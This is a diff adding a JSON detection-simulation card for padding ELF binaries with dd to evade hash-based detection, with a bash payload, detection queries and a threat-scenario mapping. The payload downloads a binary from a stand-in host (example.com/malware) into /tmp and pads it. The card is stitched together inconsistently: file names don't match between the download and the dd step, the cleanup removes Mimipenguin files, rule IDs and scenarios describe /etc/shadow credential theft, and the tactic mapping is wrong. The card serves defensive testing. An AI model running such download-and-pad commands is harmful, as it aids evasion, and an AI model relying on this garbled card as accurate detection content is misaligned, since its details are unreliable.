@@ -1,0 +1,300 @@
+{
+  "id": "TTP-2026-0215",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-06-02T00:00:00Z",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      },
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "reviewer"
+      }
+    ],
+    "tags": [
+      "plane-edr",
+      "vector-credential-dump",
+      "malware-mimipenguin",
+      "industry-all",
+      "severity-high",
+      "endpoint",
+      "linux"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "ELF Padding with dd to Evade Hash/Size Detection",
+    "summary": "An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding.",
+    "description": "An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Rocke",
+        "aliases": [
+          "Iron Group"
+        ],
+        "mitre_group_id": "G0106"
+      }
+    ],
+    "campaigns": [],
+    "malware_families": [
+      {
+        "name": "Mimipenguin"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2018-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1027",
+        "name": "T1027.001",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ],
+        "subtechnique_id": "T1027.001"
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "File: File Access",
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "Network Traffic: Network Connection Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1003.008 \u2014 Atomic Test #1 (Access /etc/shadow) and T1552.001 credential-file sweep",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR Linux agent installed and reporting healthy on the target.",
+        "check_command": "systemctl is-active cortex-agent || ps aux | grep -i traps"
+      },
+      {
+        "description": "Lab environment matching scenario SIM-EDR-001 requirements (a Linux host with a www-data service account)."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/malware.bin https://example.com/malware\nchmod +x /tmp/scratch/malware\n/bin/dd if=/tmp/scratch/malware of=/tmp/scratch/padded_malware bs=1024 count=1024 conv=notrunc\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "Padded ELF binary file",
+        "expected_value": "action_file_path contains '/tmp/scratch/padded_malware'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process executing dd command",
+        "expected_value": "action_process_image_name = '/bin/dd'"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /tmp/mimipenguin.sh /tmp/mimi_output.txt\necho '[CortexSim] SIM-EDR-001 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "a1b2c3d4e5f67890123456789012345678901234567890123456789012345678",
+        "reputation_required": "malicious",
+        "context": "Generic malware family \u2014 CortexSim does not execute it"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "Possible Binary Padding Using dd",
+        "description": "Detection of dd command being used to append null bytes to an ELF binary",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "mitre_technique_ids": [
+          "T1027.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Start - dd with conv=notrunc",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) \u2014 Possible binary padding using dd; Required Data: XDR Agent; ATT&CK T1027.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ],
+    "abiocs": [
+      {
+        "name": "Possible binary padding using dd",
+        "description": "Detection of dd command being used to append null bytes to an ELF binary to evade hash/size detection",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name = '/bin/dd'",
+        "mitre_technique_ids": [
+          "T1027.001"
+        ],
+        "severity": "high"
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "behavioral-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-EDR-0032-SHADOW",
+          "XDR-BIOC-EDR-0032-KEYSWEEP",
+          "XDR-BIOC-EDR-0032-MIMIPENGUIN"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter event_type = ENUM.FILE and action_file_path = \"/etc/shadow\" | fields _time, agent_hostname, actor_effective_username, actor_process_image_name"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-EDR-0001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation rule CR-EDR-0001 groups shadow access + key sweep + Mimipenguin into one credential-access incident."
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-LinuxCredentialTheftResponse-v1"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook isolates host, rotates exposed SSH keys and service-account credentials, opens DFIR ticket."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-RANSOM-032",
+        "name": "Endpoint Credential Theft Detection \u2014 Linux",
+        "description": "Detect Linux credential harvesting (passwd/shadow access, SSH key sweeps, /proc scraping, Mimipenguin) by a non-root service account before it enables lateral movement.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-RANSOM-032A",
+            "objective": "Cortex XDR BIOCs fire on shadow access and the credential-file sweep from www-data.",
+            "preconditions": [
+              "Cortex XDR Linux agent >= 8.4.0 installed and healthy.",
+              "BIOCs from this card imported and enabled."
+            ],
+            "steps": [
+              "Run SIM-EDR-001 steps 1-3.",
+              "Observe BIOC alerts in the Cortex console."
+            ],
+            "success_criteria": [
+              "BIOC `EDR-001 Shadow File Read by Non-Root Service Account` fires within 60s.",
+              "BIOC `EDR-001 Broad Credential File Sweep Across Home Directories` fires within 60s.",
+              "Both XQL validation queries return >= 1 row."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "threat_step_id": "TS-RANSOM-032B",
+            "objective": "Mimipenguin download-and-execute is detected and stitched with prior recon.",
+            "success_criteria": [
+              "BIOC `EDR-001 Mimipenguin Credential Dumper Execution` fires.",
+              "IOC match on the mimipenguin.sh download URL.",
+              "Correlation `CR-EDR-0001` produces a single credential-access incident."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Restrict /etc/shadow to root:shadow 0640 and audit reads with auditd.",
+      "Run web/app services under least-privilege accounts with no shell and no sudo.",
+      "Store SSH private keys with passphrases; prefer short-lived certificates.",
+      "Block outbound egress from server tiers to public code-hosting unless allowlisted."
+    ],
+    "detection_engineering": [
+      "Allowlist legitimate readers of /etc/shadow (e.g., pam, login) and alert on all others.",
+      "Hunt for find processes referencing id_rsa/.pgpass and for /proc/*/environ reads by non-owning processes.",
+      "Correlate tool-download URLs with subsequent process execution from /tmp."
+    ],
+    "response_playbook": "XSOAR-PB-LinuxCredentialTheftResponse-v1"
+  },
+  "references": [
+    {
+      "title": "Unit42 - Rocke: The Champion of Monero Miners",
+      "url": "https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1003.008 \u2014 /etc/passwd and /etc/shadow",
+      "url": "https://attack.mitre.org/techniques/T1003/008/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-EDR-001."
+    },
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-02",
+      "author": "Henry Reed",
+      "change": "Replaced skeleton detections with real Linux XDR BIOCs/XQL/IOC, added correlation CR-EDR-0001, enriched identity + panw_mapping. Promoted to active."
+    }
+  ]
+}
